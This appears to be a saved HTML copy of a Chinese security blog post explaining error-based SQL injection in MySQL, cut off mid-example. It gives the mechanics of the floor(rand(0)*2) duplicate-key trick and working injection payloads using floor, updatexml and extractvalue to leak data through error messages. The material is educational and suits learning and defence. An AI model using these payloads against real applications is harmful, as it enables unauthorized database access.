@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<!-- saved from url=(0071)https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/ -->
+<html lang="en"><script src="./SQL报错注入 - Von的博客 _ Von Blog_files/jquery.nav.js.下載"></script><script src="./SQL报错注入 - Von的博客 _ Von Blog_files/fastclick.min.js.下載"></script><script src="./SQL报错注入 - Von的博客 _ Von Blog_files/anchor.min.js.下載"></script><script type="text/javascript" src="chrome-extension://kajfghlhfkcocafkcjlajldicbikpgnp/catcher.js"><!-- script injected by Request Maker --></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Quis custodiet ipsos custodes?">
+    <meta name="keywords" content="Von, Von Blog, Von的博客, luyanchen, 卢彦臣, CTF, security, CS">
+    <meta name="theme-color" content="#000000">
+    
+    <title>SQL报错注入 - Von的博客 | Von Blog</title>
+
+    <!-- Web App Manifest -->
+    <link rel="manifest" href="https://www.v0n.top/pwa/manifest.json">
+	
+	<script type="text/x-mathjax-config;executed=true">
+  MathJax.Hub.Config({
+    tex2jax: {
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      inlineMath: [['$','$']]
+    }
+  });
+</script>
+<script src="./SQL报错注入 - Von的博客 _ Von Blog_files/latest.js.下載" async=""></script>
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.v0n.top/img/favicon.ico">
+
+    <!-- Safari Webpage Icon    by-BY -->
+    <link rel="apple-touch-icon" href="./SQL报错注入 - Von的博客 _ Von Blog_files/apple-touch-icon.png">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://vonlyc.github.io/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+    <!-- Bootstrap Core CSS -->
+    <!--<link rel="stylesheet" href="/css/bootstrap.min.css">-->
+    <style class="anchorjs"></style><link rel="stylesheet" href="./SQL报错注入 - Von的博客 _ Von Blog_files/bootstrap.min.css">
+
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="./SQL报错注入 - Von的博客 _ Von Blog_files/hux-blog.min.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="./SQL报错注入 - Von的博客 _ Von Blog_files/syntax.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="./SQL报错注入 - Von的博客 _ Von Blog_files/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+    
+     <style>
+  table{
+    border-left:1px solid #000000;border-top:1px solid #000000;
+    width: 100%;
+    word-wrap:break-word; word-break:break-all;
+  }
+  table th{
+  text-align:center;
+  }
+  table th,td{
+    border-right:1px solid #000000;border-bottom:1px solid #000000;
+  }
+</style>
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<script type="text/javascript" async="" src="./SQL报错注入 - Von的博客 _ Von Blog_files/MathJax.js.下載"></script><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
+.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
+.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
+.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
+</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_About.MathJax_MousePost {outline: none}
+.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_MenuItem {padding: 2px 2em; background: transparent}
+.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
+.MathJax_MenuActive .MathJax_MenuArrow {color: white}
+.MathJax_MenuArrow.RTL {left: .5em; right: auto}
+.MathJax_MenuCheck {position: absolute; left: .7em}
+.MathJax_MenuCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuRadioCheck {position: absolute; left: 1em}
+.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
+.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
+.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
+.MathJax_MenuDisabled {color: GrayText}
+.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
+.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
+.MathJax_ContextMenu:focus {outline: none}
+.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
+#MathJax_AboutClose {top: .2em; right: .2em}
+.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
+.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
+.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
+.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_MenuClose:hover span {background-color: #CCC!important}
+.MathJax_MenuClose:hover:focus {outline: none}
+</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
+</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
+.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
+</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
+#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+</style><style type="text/css">.MathJax_Preview {color: #888}
+#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
+#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
+.MathJax_Error {color: #CC0000; font-style: italic}
+</style><style type="text/css">.MJXp-script {font-size: .8em}
+.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
+.MJXp-bold {font-weight: bold}
+.MJXp-italic {font-style: italic}
+.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-largeop {font-size: 150%}
+.MJXp-largeop.MJXp-int {vertical-align: -.2em}
+.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
+.MJXp-display {display: block; text-align: center; margin: 1em 0}
+.MJXp-math span {display: inline-block}
+.MJXp-box {display: block!important; text-align: center}
+.MJXp-box:after {content: " "}
+.MJXp-rule {display: block!important; margin-top: .1em}
+.MJXp-char {display: block!important}
+.MJXp-mo {margin: 0 .15em}
+.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
+.MJXp-denom {display: inline-table!important; width: 100%}
+.MJXp-denom > * {display: table-row!important}
+.MJXp-surd {vertical-align: top}
+.MJXp-surd > * {display: block!important}
+.MJXp-script-box > *  {display: table!important; height: 50%}
+.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
+.MJXp-script-box > *:last-child > * {vertical-align: bottom}
+.MJXp-script-box > * > * > * {display: block!important}
+.MJXp-mphantom {visibility: hidden}
+.MJXp-munderover, .MJXp-munder {display: inline-table!important}
+.MJXp-over {display: inline-block!important; text-align: center}
+.MJXp-over > * {display: block!important}
+.MJXp-munderover > *, .MJXp-munder > * {display: table-row!important}
+.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
+.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
+.MJXp-mtr {display: table-row!important}
+.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
+.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-mlabeledtr {display: table-row!important}
+.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
+.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
+.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
+.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
+.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
+.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
+.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
+.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
+.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
+.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
+.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><script type="text/javascript" src="chrome-extension://dbjbempljhcmhlfpfacalomonjpalpko/scripts/inspector.js"></script><input type="hidden" id="_w_brink"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart=""><div id="MathJax_Message" style="display: none;"></div>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://www.v0n.top/">Von's Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div id="huxblog_navbar" class=" ">
+            <div class="navbar-collapse" style="height: 0px;">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="https://www.v0n.top/">Home</a>
+                    </li>
+                    
+                    <li>
+                        <a href="https://www.v0n.top/about/">About</a>
+                    </li>
+                    
+                    <li>
+                        <a href="https://www.v0n.top/tags/">Tags</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    var __HuxNav__ = {
+        close: function(){
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        },
+        open: function(){
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+
+    // Bind Event
+    $toggle.addEventListener('click', function(e){
+        if ($navbar.className.indexOf('in') > 0) {
+            __HuxNav__.close()
+        }else{
+            __HuxNav__.open()
+        }
+    })
+
+    /**
+     * Since Fastclick is used to delegate 'touchstart' globally
+     * to hack 300ms delay in iOS by performing a fake 'click',
+     * Using 'e.stopPropagation' to stop 'touchstart' event from 
+     * $toggle/$collapse will break global delegation.
+     * 
+     * Instead, we use a 'e.target' filter to prevent handler
+     * added to document close HuxNav.  
+     *
+     * Also, we use 'click' instead of 'touchstart' as compromise
+     */
+    document.addEventListener('click', function(e){
+        if(e.target == $toggle) return;
+        if(e.target.className == 'icon-bar') return;
+        __HuxNav__.close();
+    })
+</script>
+
+
+    <!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/post-bg-kuaidi.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/post-bg-kuaidi.jpg')
+    }
+	<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+    
+</style>
+<header class="intro-header">
+    <div class="header-mask"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="https://www.v0n.top/tags/#Web" title="Web">Web</a>
+                        
+                        <a class="tag" href="https://www.v0n.top/tags/#SQL" title="SQL">SQL</a>
+                        
+                    </div>
+                    <h1 id="sql">SQL报错注入</h1>
+                    
+                    
+                    <h2 class="subheading" id=""></h2>
+                    
+                    <span class="meta"><i class="fa fa-user" aria-hidden="true"></i>&nbsp;Von's Blog&nbsp;&nbsp;&nbsp;<i class="fa fa-calendar" aria-hidden="true"></i>&nbsp;&nbsp;2019-08-12&nbsp;&nbsp;&nbsp;<i class="fa fa-check-square-o" aria-hidden="true"></i>5686&nbsp;words&nbsp;&nbsp;<span id="busuanzi_container_page_pv" style="display: inline;">
+                    <i class="fa fa-eye" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">103</span>&nbsp;views</span>
+                </span></div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+				<h1 id="前言">前言<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E5%89%8D%E8%A8%80" aria-label="Anchor link for: 前言" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h1>
+<p>这几天更新了很多博客，在写博客查资料的过程中也收获了许多。但是今天尴尬的发现，更新的大部分内容都是密码学的。。。<br>
+觉得有些对不住web这个老本行，于是决定写一篇关于报错注入的文章来总结总结。<br>
+说到SQL报错注入，以前只是知道它的用法，但是对于它的具体原理总是不太理解，今天借这个机会一并说明。</p>
+
+<h1 id="主键重复报错">主键重复报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99" aria-label="Anchor link for: 主键重复报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h1>
+<p>利用floor()函数使SQL语句报错，实际上是由rand()，count()，group by三个函数语句联合使用造成的。<br>
+我们先看看在这一过程中使用到的函数。</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  1. concat： 连接字符串功能
+  2. floor()： 取float的整数值(向下取整）
+  3. rand()： 取0~1之间的随机浮点值
+  4. group by： 根据一个或多个列对结果集进行分组并有排序功能
+  5. floor(rand(0)*2)： 随机产生0或1
+</code></pre></div></div>
+<p>我们来逐个分析所使用的函数，首先是floor()函数，这个函数比较简单，就是对传入的数值向下取整。<br>
+接下来是rand()函数，首先我们要区分rand(0)和rand()的区别。下面的这两张图很好的阐明了他们的区别。<br>
+<img src="./SQL报错注入 - Von的博客 _ Von Blog_files/blog7-1.png" alt=""><br>
+<img src="./SQL报错注入 - Von的博客 _ Von Blog_files/blog7-2.png" alt=""><br>
+由图中可以看出，虽然它们生成的都是介于0和1的值，但是rand(0)生成的值每次都是确定的，而rand()生成的值每次都是随机的。<br>
+当我们对它们分别进行rand(0)*2和rand()*2后，发现它们的值均分布在0到2之间，唯一的区别就是rand(0)*2生成的序列是确定的而rand()*2产生的序列是随机的而已。<br>
+当我们更进一步对它们进行floor()操作也就是变成floor(rand(0)*2)和floor(rand()*2)时，我们可以猜测它们生成了0,1的序列，并且前者的序列是确定的。事实
+也证明了我们的猜测是正确的。<br>
+<img src="./SQL报错注入 - Von的博客 _ Von Blog_files/blog7-3.png" alt=""><br>
+<img src="./SQL报错注入 - Von的博客 _ Von Blog_files/blog7-4.png" alt=""></p>
+
+<hr>
+
+<p>接下来我们再来看count()和group by函数。关于这两个函数，我们经常看到如下用法:<br>
+<img src="./SQL报错注入 - Von的博客 _ Von Blog_files/blog7-5.png" alt=""><br>
+那么，他的实现过程是如何的呢？可以联想到group by子句的执行流程，最初时，username-count(*)这个数据表是空的，通过一行一行读原数据表中的user字段，如果读到的user在user-count(*) 数据表中不存在，就将它插入，并且将对应的count(*) 赋为1，如果存在，就将其对应的count(*) +1，直至扫完整个数据表。</p>
+
+<h2 id="rand02报错原理">rand(0)*2报错原理<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#rand02%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86" aria-label="Anchor link for: rand02报错原理" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h2>
+<p>了解了各个函数的用法，接下来我们就来看看具体报错的原因。其实mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个“被计算多次”到底是什么意思，就是在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下floor(rand(0)*2)报错的过程就知道了，从0x04可以看到在一次多记录的查询过程中floor(rand(0)*2)的值是定性的，为011011…(记住这个顺序很重要)，报错实际上就是floor(rand(0)*2)被计算多次导致的。<br>
+<img src="./SQL报错注入 - Von的博客 _ Von Blog_files/blog7-6.png" alt=""><br>
+1.查询前默认会建立空的虚拟表<br>
+2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕<br>
+3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕<br>
+4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了   <br>
+5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。<br>
+如果有一个序列开头时0,1,0或者1,0,1，则无论如何都不会报错了，因为虚表开头两个主键会分别是0和1，后面的就直接count(*)加1了.</p>
+
+<p>floor报错通用语句:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">((</span><span class="n">payload</span><span class="p">),</span><span class="n">floor</span> <span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div></div>
+<p>需要注意的是该语句将输出字符长度限制为64个字符。</p>
+
+<h2 id="rand2报错原理">rand()*2报错原理<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#rand2%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86" aria-label="Anchor link for: rand2报错原理" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h2>
+<p>其实rand()*2报错原理与之前的rand(0)*2原理相同，主要是要保证在开始的查询结果中，不能让虚表中存在0，1键值，不然之后无论多少条记录都不会在报错了，例如随机数：0100011在第一次取数据时插入了1，第二次取数据时插入了0，以后不会再存在主键重复的可能，就不会再报错了，因为表中已经存在0和1这两个数据。<br>
+需要注意的是,rand()*2当有两条记录的时候就可以报错（但是不绝对），而rand(0)*2只有当三条记录及以上才能报错（但是一定可以报错）。</p>
+
+<h1 id="xpath语法错误报错">xpath语法错误报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%E6%8A%A5%E9%94%99" aria-label="Anchor link for: xpath语法错误报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h1>
+<p>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容。</p>
+<h2 id="updatexml报错">updatexml()报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#updatexml%E6%8A%A5%E9%94%99" aria-label="Anchor link for: updatexml报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UPDATEXML (XML_document, XPath_string, new_value);
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+第三个参数：new_value，String格式，替换查找到的符合条件的数据 。
+</code></pre></div></div>
+<p>第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。因此我们可以故意使它报错。
+如：</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">pname</span><span class="p">,</span><span class="n">page</span> <span class="k">from</span> <span class="n">person</span> <span class="k">where</span> <span class="n">pwd</span> <span class="o">=</span> <span class="s1">'111'</span> <span class="k">and</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="extractvalue报错">extractvalue()报错<a class="anchorjs-link " href="https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#extractvalue%E6%8A%A5%E9%94%99" aria-label="Anchor link for: extractvalue报错" data-anchorjs-icon="#" style="opacity: 1; padding-left: 0.375em;"></a></h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  1. extractvalue()：从目标 XML 中返回包含所查询值的字符串。
+  2. EXTRACTVALUE (XML_document, XPath_string);
+  3. 第一个参数：XML_document是 String 格式，为 XML 文档对象的名称，文中为 Doc 。
+  4. 第二个参数：XPath_string ( Xpath 格式的字符串)
+</code></pre></div></div>
+<p>同样，我们可以让它第二个参数错误来爆出数据。</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">pname</span><span class="p">,</span><span class="n">page</span> <span class="k">from</span> <span class="n">person</span> <span class="k">where</span> <span class="n">pwd</span> <span class="o">=</span> <span class="s1">'111'</span> <span class="k">and</span> <span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="s1">'hhhhhhh'</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">substring</span><span class="p">(</span><span class="n">hex</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">())),</span><span class="mi">1</span><span class="p">,</span><span 